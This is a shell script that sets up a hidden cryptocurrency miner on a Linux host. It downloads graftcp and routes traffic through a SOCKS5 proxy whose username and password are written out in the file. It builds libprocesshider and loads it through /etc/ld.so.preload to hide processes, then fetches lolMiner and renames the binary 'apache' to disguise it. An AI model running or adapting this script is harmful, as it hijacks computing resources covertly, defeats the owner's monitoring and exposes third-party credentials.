#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
apt update
apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
service tor start
wget https://raw.githubusercontent.com/hanifgz/ngarit/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = fra.socks.ipvanish.com:1080
socks5_username = VGNEZW3FxOX
socks5_password = hgim5dkC59
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

git clone https://github.com/hanifgz/libprocesshider.git
cd libprocesshider;make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
cd ..

wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.41/lolMiner_v1.41b_Lin64.tar.gz
tar -xf lolMiner_v1.41b_Lin64.tar.gz
cd 1.41b
mv lolMiner ../apache
cd ..

screen ./graftcp/graftcp bash
